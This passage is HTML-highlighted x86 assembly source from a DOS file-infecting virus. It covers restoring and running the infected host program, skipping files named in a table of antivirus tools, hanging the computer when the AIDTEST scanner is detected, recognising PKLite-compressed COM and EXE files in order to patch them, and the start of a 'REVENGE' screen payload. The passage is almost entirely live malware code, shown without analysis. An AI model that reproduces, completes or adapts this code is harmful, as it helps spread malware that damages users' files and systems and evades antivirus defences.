                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">check_valid_fname</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">check_valid_fname</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">remove_from_memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_sp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Set stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">file_ip</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Exec host</span><span class="sc0">

</span><span class="sc5">file_ip</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_cs</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_sp</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_ss</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">check_valid_fname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">av_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">l_search_fname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_search</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc13">'\'       ; Start of directory/file name?
</span><span class="sc0">                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">mark_position</span><span class="sc0">           </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
</span><span class="sc5">next_search_fname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_search_fname</span><span class="sc0">

</span><span class="sc5">mark_position</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_search_fname</span><span class="sc0">

</span><span class="sc5">end_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">next_inv_fname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get 2 chars from table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'##'</span><span class="sc0">         </span><span class="sc1">; End of table?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">valid_fname</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'DI'</span><span class="sc0">     </span><span class="sc1">; '?ID*.*' ? (AIDTEST?)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_table</span><span class="sc0">     </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">print_msg_russ</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">

</span><span class="sc5">check_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Invalid filename (in table)?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">invalid_fname</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Next table entry</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_inv_fname</span><span class="sc0">

</span><span class="sc5">valid_fname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">invalid_fname</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_attr</span><span class="sc0">

</span><span class="sc5">convert2uppercase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">l_c2up</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_c2up</span><span class="sc0">       </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">          </span><span class="sc1">; In lowercase?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">next_c2up</span><span class="sc0">       </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">          </span><span class="sc1">; In lowercase?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">next_c2up</span><span class="sc0">       </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">          </span><span class="sc1">; Convert in uppercase</span><span class="sc0">
</span><span class="sc5">next_c2up</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_c2up</span><span class="sc0">

</span><span class="sc5">exit_c2up</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Crazy Little Thing Called PkLite'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">check4pklite_com</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc2">50h</span><span class="sc0">        </span><span class="sc1">; PUSH AX? (PKL 1.50+)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_pk150</span><span class="sc0">                        </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">; Skip 'push ax'</span><span class="sc0">
</span><span class="sc5">no_pk150</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">       </span><span class="sc1">; MOV AX,xxxx?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_pklite</span><span class="sc0">                       </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0BAh</span><span class="sc0">     </span><span class="sc1">; MOV DX,xxxx?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_pklite</span><span class="sc0">                       </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header</span><span class="sc4">)+</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">l_crc_pkl</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Make CRC of code</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_crc_pkl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">          </span><span class="sc1">; PKLite 1.00?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pk_100</span><span class="sc0">          </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc0">         </span><span class="sc1">; PKLite 1.15?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pk_115</span><span class="sc0">          </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc0">          </span><span class="sc1">; PKLite 1.50?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">pk_150</span><span class="sc0">          </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_pklite</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">pk_100</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_patchcom2</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">inc_ofs_patch1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Dir patch+0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pklite_found</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">pk_115</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_patchcom2</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">inc_ofs_patch1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Dir patch+0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pklite_found</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">pk_150</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_patchcom2</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">inc_ofs_patch1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Dir patch+1</span><span class="sc0">
</span><span class="sc5">pklite_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0"> 
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pklite</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

</span><span class="sc5">no_pklite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0"> 
</span><span class="sc5">pklite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">check4pklite_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">_relocs</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">  </span><span class="sc1">; CS segment=0FFF0h? (like pklited file)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_found_pkexe</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">_exeip</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">     </span><span class="sc1">; IP=100h? (like pklited files)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_found_pkexe</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; Yes? Seems to be a pklited exe file</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">_hdrsize</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; header size * 16 = start of code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_segcode</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Skip 6 bytes</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Lseek to end of header+6</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_pkexe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Read from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pkexe_code</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_pkexe</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">l_cmp_pkcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Check if it's a pklited exe file</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_found_pkexe</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_cmp_pkcode</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0"> 
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">not_found_pkexe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0"> 
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">buffer_pkexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pkexe_code</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;               add     ax,0</span><span class="sc0">
</span><span class="sc1">;               cmp     ax,[2]</span><span class="sc0">
</span><span class="sc1">;               jnb     $+1Ch</span><span class="sc0">
</span><span class="sc1">;               sub     ax,0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">73h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Dh</span><span class="sc0">
</span><span class="sc5">ofs_segcode</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">print_msg_russ</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">msg_russian</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Print msg</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0"> 
                </span><span class="sc6">hlt</span><span class="sc0">                     </span><span class="sc1">; Hang computer</span><span class="sc0">

</span><span class="sc5">print_REVENGE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; VIDEO: Change mode to 80x25 16col.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; why??</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; why??</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; VIDEO: Set cursor characteristics</span><span class="sc0">
                                </span><span class="sc1">; CH bits 0-4 = start line in character cell</span><span class="sc0">
                                </span><span class="sc1">; bits 5-6 = blink attribute</span><span class="sc0">
